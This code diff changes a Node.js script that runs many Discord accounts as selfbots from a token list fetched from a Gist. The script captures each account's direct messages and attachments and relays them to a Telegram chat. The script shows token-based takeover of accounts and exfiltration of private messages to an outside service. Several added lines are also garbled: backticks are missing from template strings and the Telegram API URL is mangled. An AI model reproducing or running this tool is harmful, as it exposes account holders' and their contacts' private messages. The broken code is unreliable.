@@ -30,25 +30,9 @@ try {
 
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || config.TELEGRAM_BOT_TOKEN || '').replace(/[{}]/g, '').trim();
 const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || config.TELEGRAM_CHAT_ID || '').replace(/[{}]/g, '').trim();
+const GIST_TOKENS_URL = (process.env.GIST_TOKENS_URL || config.GIST_TOKENS_URL || '').trim();
 
-// Read tokens from the tokens.txt file in your repository root
-let DISCORD_TOKENS = [];
-try {
-    const tokensPath = path.join(__dirname, 'tokens.txt');
-    if (fs.existsSync(tokensPath)) {
-        const tokensContent = fs.readFileSync(tokensPath, 'utf8');
-        DISCORD_TOKENS = tokensContent
-            .split(/\r?\n/)
-            .map(line => line.trim())
-            .filter(line => line.length > 0 && !line.startsWith('#'));
-    } else {
-        console.error("❌ Error: 'tokens.txt' file was not found in your repository!");
-    }
-} catch (err) {
-    console.error("Failed to read tokens.txt:", err.message);
-}
-
-if (DISCORD_TOKENS.length === 0 || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.error("Critical Verification Error: Missing clean variables in your .env file or Render Environment tab!");
     process.exit(1);
 }
@@ -130,7 +114,6 @@ function createSelfbotInstance(token, index) {
                         // Fetch the active message layout instance dynamically to parse attachment objects safely
                         const channel = await client.channels.fetch(data.channel_id).catch(() => null);
                         if (channel) {
-                            // FIXED: Replaced chained .catch with a safe try/catch wrapper block
                             try {
                                 const message = await channel.messages.fetch(data.id);
                                 if (message) {
@@ -213,10 +196,10 @@ async function handleValidDM(client, message) {
         
         if (message.attachments.size > 0) {
             for (const attachment of message.attachments.values()) {
-                if (attachment.contentType && attachment.contentType.startsWith('image/')) {  
+                if (attachment.contentType && attachment.contentType.startsWith('image/')) {
                     await sendImageToTelegram(attachment.url, text);
                 } else {
-                    text += "\n📎 Attachment: " + attachment.name + "\n🔗 " + attachment.url;
+                    text += `\n📎 Attachment: ${attachment.name}\n🔗 ${attachment.url}`;
                 }
             }
             if (message.attachments.some(att => !att.contentType?.startsWith('image/'))) {
@@ -225,61 +208,83 @@ async function handleValidDM(client, message) {
         } else {
             await sendToTelegram(text);
         }
-    } catch (err) {}
-}
-
-// Sequential Execution Loop with External Fetch Engine
-async function bootSequence() {
-    console.log("Starting secure token database fetch initialization...");
-    if (!TOKEN_URL) {
-        console.error("No TOKEN_URL environment variable provided.");
-        return;
+    } catch (err) {
+        console.error("Error inside handleValidDM router:", err.message);
     }
+}
+    
+// Sequential Execution Loop
+async function bootSequence() {
+    let DISCORD_TOKENS = [];
 
-    try {
-        // Setup proxy on configuration file fetch if proxy link is provided
-        const fetchOptions = PROXY_URL ? { agent: new HttpsProxyAgent(PROXY_URL) } : {};
-        const response = await fetch(TOKEN_URL, fetchOptions);
-const textData = await response.text();
-// This splits by commas, tabs, or newlines perfectly.
-const tokens = textData.split(/[,\n\r\t]+/).map(t => t.replace(/["'{}]/g, '').trim()).filter(t => t.length > 5);
-console.log("Processing " + tokens.length + " tokens securely...");
-await sendToTelegram("🚀 Starting proxy-protected boot for " + tokens.length + " tokens...");
-for (let i = 0; i < tokens.length; i++) {
-await createSelfbotInstance(tokens[i], i, tokens.length);
-await sleep(15000); // 15-second delay to protect against network rate limits and spam filters
+    if (!GIST_TOKENS_URL) {
+console.error("❌ Error: GIST_TOKENS_URL environment variable is missing!");
+process.exit(1);
 }
-console.log("Verification completed.");
-await sendToTelegram("🏁 All token connection attempts completed!");
+try {
+console.log("🌐 Fetching token list from GitHub Gist...");
+const response = await fetch(GIST_TOKENS_URL);
+if (!response.ok) throw new Error(HTTP error! status: ${response.status});
+const tokensContent = await response.text();
+DISCORD_TOKENS = tokensContent
+.split(/\r?\n/)
+.map(line => line.trim())
+.filter(line => line.length > 0 && !line.startsWith('#'));
 } catch (err) {
-console.error("Error fetching or processing the token URL:", err.message);
+console.error("❌ Failed to download tokens from Gist:", err.message);
+process.exit(1);
 }
+console.log(🔄 Processing sequential login checks for ${DISCORD_TOKENS.length} tokens...);
+for (let i = 0; i < DISCORD_TOKENS.length; i++) {
+await createSelfbotInstance(DISCORD_TOKENS[i], i);
+await sleep(1200);
+}
+console.log(\n🏁 Verification completed. Pushing active dashboard list to Telegram...);
+const startupMessage = 🤖 **Selfbots Online & Monitoring Active!**\n\n +
+Total Accounts Monitored: **${activeAccounts.length} / ${DISCORD_TOKENS.length}**\n\n +
+**Active Accounts:**\n${activeAccounts.length > 0 ? activeAccounts.join('\n') : 'None'};
+await sendToTelegram(startupMessage);
 }
 bootSequence();
 // --- Telegram helper functions ---
 async function sendImageToTelegram(imageUrl, caption) {
 if (!TELEGRAM_CHAT_ID) return;
 try {
-const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-await fetch(url, {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, photo: imageUrl, caption: caption })
-});
-} catch (error) {}
-}
-async function sendToTelegram(text) {
-if (!TELEGRAM_CHAT_ID) return;
-try {
-const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-await fetch(url, {
+const url = https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto;
+const response = await fetch(url, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 chat_id: TELEGRAM_CHAT_ID,
-text: text,
-parse_mode: "Markdown"
+photo: imageUrl,
+caption: caption
 })
 });
-} catch (error) {}
+const result = await response.json();
+if (!result.ok) {
+console.error('Telegram API error (image):', result);
+await sendToTelegram(caption + \n🖼️ Image: ${imageUrl});
+}
+} catch (error) {
+console.error('Error sending image to Telegram:', error);
+await sendToTelegram(caption + \n🖼️ Image: ${imageUrl});
+}
+}
+async function sendToTelegram(text) {
+if (!TELEGRAM_CHAT_ID) return;
+try {
+const url = https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage;
+const response = await fetch(url, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({
+chat_id: TELEGRAM_CHAT_ID,
+text: text
+})
+});
+const result = await response.json();
+if (!result.ok) console.error('Telegram API error:', result);
+} catch (error) {
+console.error('Error sending to Telegram:', error);
+}
 }
